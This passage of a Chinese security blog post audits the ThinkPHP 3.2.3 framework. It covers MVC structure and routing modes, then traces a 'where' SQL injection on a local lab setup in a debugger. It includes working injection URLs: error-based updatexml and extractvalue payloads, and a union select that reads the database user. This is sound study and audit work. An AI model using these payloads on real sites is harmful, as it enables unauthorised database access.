{"title":"简记一次Tp3框架审计之旅","uid":"9fb5d47ccfc09f50e02bb64494717cba","slug":"简记一次Tp3框架审计之旅","date":"2023-01-17T19:42:20.000Z","updated":"2024-02-14T07:40:46.000Z","comments":true,"path":"api/articles/简记一次Tp3框架审计之旅.json","keywords":null,"cover":"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141548159.png","content":"<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>MVC框架是代码审计必需学习的知识，这里以TpV3.2.3框架为例，进行一次对MVC框架代码的漏洞审计，简单学一下MVC的相关知识，希望对正在学习MVC框架的师傅有所帮助</p>\n<h1 id=\"框架\"><a href=\"#框架\" class=\"headerlink\" title=\"框架\"></a>框架</h1><p>我们这里首先需要了解一下什么是MVC架构</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token constant\">M</span>：<span class=\"token function\">Model</span><span class=\"token punctuation\">(</span>模型<span class=\"token punctuation\">)</span>，其负责业务数据的处理和与数据库的交互\n<span class=\"token constant\">V</span>：<span class=\"token function\">View</span><span class=\"token punctuation\">(</span>视图<span class=\"token punctuation\">)</span>，提供了展示数据的各种方式\n<span class=\"token constant\">C</span>：<span class=\"token function\">Controller</span><span class=\"token punctuation\">(</span>控制器<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>负责用户请求的调度和处理业务逻辑<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n<p>具体如下图<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141549730.png\" alt=\"在这里插入图片描述\"><br>如果想对MVC框架进行进一步了解，可以参考<a href=\"https://www.kancloud.cn/manual/thinkphp/1698\">https://www.kancloud.cn/manual/thinkphp/1698</a><br>接下来我们需要了解一下ThinkPHP框架。</p>\n<h2 id=\"TP3\"><a href=\"#TP3\" class=\"headerlink\" title=\"TP3\"></a>TP3</h2><p>如果想了解Tp3常见的操作，可以看一下这篇文章<br><a href=\"https://blog.csdn.net/spc007spc/article/details/103489711\">https://blog.csdn.net/spc007spc/article/details/103489711</a></p>\n<h3 id=\"目录文件\"><a href=\"#目录文件\" class=\"headerlink\" title=\"目录文件\"></a>目录文件</h3><p>Tp3的目录如下所示</p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>www  WEB部署目录（或者子目录）<br>├─index.php       入口文件<br>├─README.md       README文件<br>├─Application     应用目录<br>├─Public          资源文件目录<br>└─ThinkPHP        框架目录</p></blockquote>\n<p>通俗的说的话，这里的<code>index.php</code>就是提供一个对外的接口，<code>Public</code>就是存放一些公共资源的地方，<code>ThinkPHP</code>是我们的核心框架，其内容如下</p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>├─ThinkPHP 框架系统目录（可以部署在非web目录下面）<br>│  ├─Common       核心公共函数目录<br>│  ├─Conf         核心配置目录<br>│  ├─Lang         核心语言包目录<br>│  ├─Library      框架类库目录<br>│  │  ├─Think     核心Think类库包目录<br>│  │  ├─Behavior  行为类库目录<br>│  │  ├─Org       Org类库包目录<br>│  │  ├─Vendor    第三方类库目录<br>│  │  ├─ …      更多类库目录<br>│  ├─Mode         框架应用模式目录<br>│  ├─Tpl          系统模板目录<br>│  ├─LICENSE.txt  框架授权协议文件<br>│  ├─logo.png     框架LOGO文件<br>│  ├─README.txt   框架README文件<br>│  └─ThinkPHP.php 框架入口文件</p></blockquote>\n<h3 id=\"路由格式\"><a href=\"#路由格式\" class=\"headerlink\" title=\"路由格式\"></a>路由格式</h3><p>Tp3提供了多种路由格式，这里的话对其进行简单介绍。</p>\n<h4 id=\"pathinfo模式\"><a href=\"#pathinfo模式\" class=\"headerlink\" title=\"pathinfo模式\"></a>pathinfo模式</h4><p>pathinfo 模式，是ThinkPHP的默认模式，其规范格式如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">http<span class=\"token punctuation\">:</span><span class=\"token comment\">//网址/index.php/模块/控制器/操作方法/参数/参数值</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>示例如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">http<span class=\"token punctuation\">:</span><span class=\"token comment\">//127.0.0.1:8080/index.php/Home/Index/index/id/2</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141549663.png\" alt=\"在这里插入图片描述\"><br>它的优点显而易见， 简化了URL地址。</p>\n<h4 id=\"普通模式\"><a href=\"#普通模式\" class=\"headerlink\" title=\"普通模式\"></a>普通模式</h4><p>普通模式的规范格式如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">http<span class=\"token punctuation\">:</span><span class=\"token comment\">//网址/index.php?m=模块名称&amp;c=控制器&amp;a=方法&amp;参数=参数值</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>示例如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">http<span class=\"token punctuation\">:</span><span class=\"token comment\">//127.0.0.1:8080/index.php?m=Home&amp;c=index&amp;a=index&amp;id=1</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141549651.png\" alt=\"在这里插入图片描述\"></p>\n<h4 id=\"兼容模式\"><a href=\"#兼容模式\" class=\"headerlink\" title=\"兼容模式\"></a>兼容模式</h4><p>兼容模式的规范格式如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">http<span class=\"token punctuation\">:</span><span class=\"token comment\">//网址/index.php?s=/模块名称/控制器/方法/参数/参数值</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>示例如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">http<span class=\"token punctuation\">:</span><span class=\"token comment\">//127.0.0.1:8080/index.php?s=Home/index/index/id/33</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h4 id=\"rewrite-模式\"><a href=\"#rewrite-模式\" class=\"headerlink\" title=\"rewrite 模式\"></a>rewrite 模式</h4><p>这个的话首先需要说一下配置，这个想要使用首先需要<code>Apache</code>开启<code>rewrite拓展</code>，我这里的环境是<code>phpstudy</code>集成环境，具体操作如下。<br>首先打开<code>&quot;phpStudy\\PHPTutorial\\Apache\\conf\\httpd.conf&quot;</code>文件，搜索<code>rewrite_module</code>将其前面的<code>#</code>删去<img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141549685.png\" alt=\"在这里插入图片描述\"><br>而后去TP的根目录，写一个<code>.htaccess</code>文件，内容如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token operator\">&lt;</span>IfModule mod_rewrite<span class=\"token operator\">.</span>c<span class=\"token operator\">></span>\n RewriteEngine on\n RewriteCond <span class=\"token operator\">%</span><span class=\"token punctuation\">&#123;</span><span class=\"token constant\">REQUEST_FILENAME</span><span class=\"token punctuation\">&#125;</span> <span class=\"token operator\">!</span><span class=\"token operator\">-</span>d\n RewriteCond <span class=\"token operator\">%</span><span class=\"token punctuation\">&#123;</span><span class=\"token constant\">REQUEST_FILENAME</span><span class=\"token punctuation\">&#125;</span> <span class=\"token operator\">!</span><span class=\"token operator\">-</span>f\n RewriteRule <span class=\"token operator\">^</span><span class=\"token punctuation\">(</span><span class=\"token operator\">.</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>$ index<span class=\"token operator\">.</span>php<span class=\"token operator\">?</span>s<span class=\"token operator\">=</span><span class=\"token variable\">$1</span> <span class=\"token punctuation\">[</span><span class=\"token constant\">QSA</span><span class=\"token punctuation\">,</span><span class=\"token constant\">PT</span><span class=\"token punctuation\">,</span><span class=\"token constant\">L</span><span class=\"token punctuation\">]</span>\n<span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>IfModule<span class=\"token operator\">></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>接下来重启phpstudy<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141549545.png\" alt=\"在这里插入图片描述\"><br>此时就配置好了。(如若是linux环境，可参考此文<a href=\"https://blog.csdn.net/zhazhaji/article/details/80493513\">https://blog.csdn.net/zhazhaji/article/details/80493513</a>)<br>rewrite的规范格式如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">http<span class=\"token punctuation\">:</span><span class=\"token comment\">//网址/模块/控制器/操作方法/参数/参数值</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>其实相比于默认模式就是少了个入口文件，看着更简洁了一些。<br>示例如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">http<span class=\"token punctuation\">:</span><span class=\"token comment\">//127.0.0.1:8080/Home/index/index/id/2</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141549269.png\" alt=\"在这里插入图片描述\"></p>\n<h3 id=\"特殊方法\"><a href=\"#特殊方法\" class=\"headerlink\" title=\"特殊方法\"></a>特殊方法</h3><p>ThinkPHP将一些经常使用的方法进行了封装，也就是我们这里的特殊方法，其目的在于使程序更加安全。<br>接下来对几个相对较常用的方法进行简单介绍。<br>如果想进行仔细了解，可以访问如下链接<br><a href=\"https://www.cnblogs.com/kenshinobiy/p/9165662.html\">https://www.cnblogs.com/kenshinobiy/p/9165662.html</a><br><a href=\"https://www.thinkphp.cn/info/tag/name/%E5%87%BD%E6%95%B0/p/1.html\">https://www.thinkphp.cn/info/tag</a></p>\n<h4 id=\"I方法\"><a href=\"#I方法\" class=\"headerlink\" title=\"I方法\"></a>I方法</h4><p>I方法是ThinkPHP用于更加方便和安全的获取系统输入变量，可以用于任何地方，用法格式如下：</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token function\">I</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'变量类型.变量名/修饰符'</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'默认值'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'过滤方法或正则'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'额外数据源'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>示例如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token keyword\">echo</span> <span class=\"token function\">I</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'get.id'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//等同于$_GET['id']</span>\n<span class=\"token keyword\">echo</span> <span class=\"token function\">I</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'get.id'</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 如果不存在$_GET['id'] 则返回0</span>\n<span class=\"token keyword\">echo</span> <span class=\"token function\">I</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'get.name'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">''</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 如果不存在$_GET['name'] 则返回空字符串</span>\n<span class=\"token keyword\">echo</span> <span class=\"token function\">I</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'get.name'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">''</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'htmlspecialchars'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 采用htmlspecialchars方法对$_GET['name'] 进行过滤，如果不存在则返回空字符串</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n<h4 id=\"M方法\"><a href=\"#M方法\" class=\"headerlink\" title=\"M方法\"></a>M方法</h4><p>M方法用于实例化一个基础模型类，M方法的调用格式：</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token function\">M</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'[基础模型名:]模型名'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'数据表前缀'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'数据库连接信息'</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>示例如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token variable\">$User</span> <span class=\"token operator\">=</span> <span class=\"token function\">M</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'User'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">#等效于$User = new Model('User');</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n<h4 id=\"C方法\"><a href=\"#C方法\" class=\"headerlink\" title=\"C方法\"></a>C方法</h4><p>C方法是ThinkPHP用于设置、获取，以及保存配置参数的方法。</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token variable\">$model</span> <span class=\"token operator\">=</span> <span class=\"token function\">C</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'db_name'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'thinkphp'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//读取当前的URL模式配置参数</span>\n<span class=\"token variable\">$userType</span> <span class=\"token operator\">=</span> <span class=\"token function\">C</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'USER_TYPE'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//获取USER_TYPE参数的值</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<h1 id=\"漏洞分析\"><a href=\"#漏洞分析\" class=\"headerlink\" title=\"漏洞分析\"></a>漏洞分析</h1><h2 id=\"SQL注入\"><a href=\"#SQL注入\" class=\"headerlink\" title=\"SQL注入\"></a>SQL注入</h2><h3 id=\"环境搭建\"><a href=\"#环境搭建\" class=\"headerlink\" title=\"环境搭建\"></a>环境搭建</h3><p>首先我们需要做一些配置。<br>我们需要在本地Mysql中新建一个<code>thinkphp</code>数据库用于测试，然后在其中新建一个<code>users</code>数据表，包括<code>id、username、passwd</code>三个字段<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141549294.png\" alt=\"在这里插入图片描述\"><br>接下来我们需要让Tp与Mysql中的数据库进行对接。<br>打开<code>Application\\Home\\Conf\\config.php</code>，写入以下内容</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token keyword\">return</span> <span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span>\n <span class=\"token string single-quoted-string\">'DB_TYPE'</span> <span class=\"token operator\">=></span> <span class=\"token string single-quoted-string\">'mysql'</span><span class=\"token punctuation\">,</span> <span class=\"token comment\">// 数据库类型</span>\n <span class=\"token string single-quoted-string\">'DB_HOST'</span> <span class=\"token operator\">=></span> <span class=\"token string single-quoted-string\">'localhost'</span><span class=\"token punctuation\">,</span> <span class=\"token comment\">// 服务器地址</span>\n <span class=\"token string single-quoted-string\">'DB_NAME'</span> <span class=\"token operator\">=></span> <span class=\"token string single-quoted-string\">'thinkphp'</span><span class=\"token punctuation\">,</span> <span class=\"token comment\">// 数据库名</span>\n <span class=\"token string single-quoted-string\">'DB_USER'</span> <span class=\"token operator\">=></span> <span class=\"token string single-quoted-string\">'root'</span><span class=\"token punctuation\">,</span> <span class=\"token comment\">// 用户名</span>\n <span class=\"token string single-quoted-string\">'DB_PWD'</span> <span class=\"token operator\">=></span> <span class=\"token string single-quoted-string\">'root'</span><span class=\"token punctuation\">,</span> <span class=\"token comment\">// 密码</span>\n <span class=\"token string single-quoted-string\">'DB_PORT'</span> <span class=\"token operator\">=></span> <span class=\"token number\">3306</span><span class=\"token punctuation\">,</span> <span class=\"token comment\">// 端口</span>\n <span class=\"token string single-quoted-string\">'DB_PREFIX'</span> <span class=\"token operator\">=></span> <span class=\"token string single-quoted-string\">''</span><span class=\"token punctuation\">,</span> <span class=\"token comment\">// 数据库表前缀 </span>\n <span class=\"token string single-quoted-string\">'DB_CHARSET'</span><span class=\"token operator\">=></span> <span class=\"token string single-quoted-string\">'utf8'</span><span class=\"token punctuation\">,</span> <span class=\"token comment\">// 字符集</span>\n <span class=\"token string single-quoted-string\">'DB_DEBUG'</span> <span class=\"token operator\">=></span> <span class=\"token constant boolean\">TRUE</span><span class=\"token punctuation\">,</span> <span class=\"token comment\">// 数据库调试模式 开启后可以记录SQL日志 3.2.3新增</span>\n<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>此时环境便搭建好了。</p>\n<h3 id=\"where注入\"><a href=\"#where注入\" class=\"headerlink\" title=\"where注入\"></a>where注入</h3><p>打开<code>/Application/Home/Controller/IndexController.class.php</code>，添加内容如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">select</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token variable\">$id</span> <span class=\"token operator\">=</span> <span class=\"token function\">I</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'get.id'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$user</span> <span class=\"token operator\">=</span> <span class=\"token function\">M</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'users'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$data</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$user</span><span class=\"token operator\">-></span><span class=\"token function\">find</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$id</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">var_dump</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$data</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141549416.png\" alt=\"在这里插入图片描述\"><br>此时先在<code>I方法</code>处添加断点<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141549372.png\" alt=\"在这里插入图片描述\"></p>\n<p>接下来我们写入我们的语句</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">http<span class=\"token punctuation\">:</span><span class=\"token comment\">//127.0.0.1:8080/index.php/home/index/select?id[where]=1 and 1=updatexml(1,concat(0x7e,user(),0x7e),1)-- -</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>访问之<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141549391.png\" alt=\"在这里插入图片描述\"><br>然后开始单步调试<br>一开始都是赋值这种，后面看到这里<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141549426.png\" alt=\"在这里插入图片描述\"><br>可以发现有一个<code>htmlspecialchars</code>函数过滤，不过这个主要是针对XSS的，所以对SQL注入影响不大，接着看，到最后<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141549031.png\" alt=\"在这里插入图片描述\"><br>可以发现这里的value就是我们写入的语句，即<code>1 and 1=updatexml(1,concat(0x7e,user(),0x7e),1)-- -</code><br>然后这里的话他过滤的关键词是</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/^(EXP|NEQ|GT|EGT|LT|ELT|OR|XOR|LIKE|NOTLIKE|NOT BETWEEN|NOTBETWEEN|BETWEEN|NOTIN|NOT IN|IN)$/i'</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$value</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token variable\">$value</span> <span class=\"token operator\">.=</span> <span class=\"token string single-quoted-string\">' '</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n<p>显而易见，过滤的很少，报错注入的<code>updatexml</code>和<code>extractvalue</code>，以及联合查询的<code>union</code>也未被过滤，所以这里也可以使用其他语句，例如</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">http<span class=\"token punctuation\">:</span><span class=\"token comment\">//127.0.0.1:8080/index.php/home/index/select?id[where]=1 and 1=extractvalue(1,concat(0x7e,user(),0x7e))-- -</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141549040.png\" alt=\"在这里插入图片描述\"><br>亦可使用联合查询</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">http<span class=\"token punctuation\">:</span><span class=\"token comment\">//127.0.0.1:8080/index.php/home/index/select?id[where]=0 union select user(),2,3</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141549057.png\" alt=\"在这里插入图片描述\"><br>接下来调整断点，将断点放在<code>find</code>处，进行单步调试<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141549106.png\" alt=\"在这里插入图片描述\"><br>跟进<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141549097.png\" alt=\"在这里插入图片描述\">可以看到这里是判断数值是否为数字字符串串或字符串，满足的话就走if条件下的函数，不过看明显可以看出我们这里是数组（看旁边的<code>options</code>的值为<code>array(1)</code>也可以发现），不满足条件，所以直接走下面。<br>走到这个</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\">$pk <span class=\"token operator\">=</span> $this<span class=\"token operator\">-</span><span class=\"token operator\">></span>getPk<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>跟进<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141549053.png\" alt=\"在这里插入图片描述\"><br>在上面发现<code>$pk=id</code><br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141549428.png\" alt=\"在这里插入图片描述\"><br>接下来继续往下走<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141549503.png\" alt=\"在这里插入图片描述\"><br>这里检验了<code>$pk</code>是否为数组，因不满足条件(此处<code>$pk=&#39;id&#39;</code>)，所以直接走下面<img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141549493.png\" alt=\"在这里插入图片描述\"><br>接下来是添加<code>limit=1</code>，然后这个用了<code>_parseOptions</code>函数进行处理，跟进此自定义函数<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141549565.png\" alt=\"在这里插入图片描述\"><br>这里的话可以看到有一个过滤的，但我们这里的话简单看一下就会发现，这里条件并不满足，我们这里的where的值是</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token number\">0</span> union select user<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span><span class=\"token number\">3</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>所以这里的话就直接pass，接下来继续走<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141549632.png\" 